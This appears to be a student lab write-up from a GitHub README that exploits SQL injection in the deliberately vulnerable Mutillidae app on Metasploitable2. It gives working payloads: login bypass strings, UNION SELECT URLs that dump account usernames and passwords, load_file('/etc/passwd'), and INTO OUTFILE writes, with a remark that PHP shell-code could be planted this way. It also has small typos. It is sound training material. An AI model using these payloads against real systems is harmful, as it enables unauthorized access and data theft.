# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.

Identify IP address using ifconfig in Metasploitable2

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

Click on the menu Login/Register and register for an account

Click on the link “Please register here”

Click on “Create Account” to display the following page:


![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/300c4b9e-5121-4407-97c6-89b3ba1211e4)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

Click “Login”. The logged in page will show as below: 

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/c146a155-2f08-4958-9ab5-58019fc2eb12)

## Bypassing login field
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”


Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. ![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/c4adfb94-fa1d-460d-8a5f-007fbd45164c)


Click the login button and you will see it enter into the administrator page. 


Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: 

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/ff26febb-8a81-4d7e-87d9-a21f982fb89c)

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/9ce59cf7-706b-423e-9d0b-fa58119625df)


![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/e78c1e70-1aa1-49a4-8d1b-e7ded6479b27)

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/51ef5a08-357b-49cf-8d26-7fb0eb785ba5)

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/4570d6ba-f576-4022-9fbf-6e13ed2c3927)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned. 

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/50af2613-c08d-4e75-aa32-2af50972bd79)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/96099cf7-3d0f-493c-aa7a-0f18aa35a6ac)

After adding the order by 6 into the existing url , the following error statement will be obtained: 

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/032fca52-1c39-48cc-9aed-eeacb0ea74a7)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6. 

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/fbda5226-c4e8-4c73-a5f2-304d6980a079)

As it is having 5 columns the query worked fine and it provides the correct result 

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/7b30686e-1abd-4c9c-ac77-3a17eabd8781)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5). 

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/f05dcf50-3f5f-4501-b5e7-898f1c57144f)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information. 
![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/1d6fdf39-597d-4c23-b324-293ddc658b0b)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/655d9935-6bf2-417d-a615-154e0953b709)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details 
![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/638290c7-0f83-4dbf-90b7-2b614f2955d2)

The url once executed will retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table. image
![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/7448bad5-e504-4d06-86dc-5dfe5e63ec3f)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 
![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/f44fd7d5-0b65-41fa-9f33-9a84b532bb45)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/87940cf4-1e53-494c-a91d-44966f49c3c7)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/MARXINLIJO/sqlinjection/assets/145742540/82277ab3-6a01-41c8-a090-b426a4091dbd)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
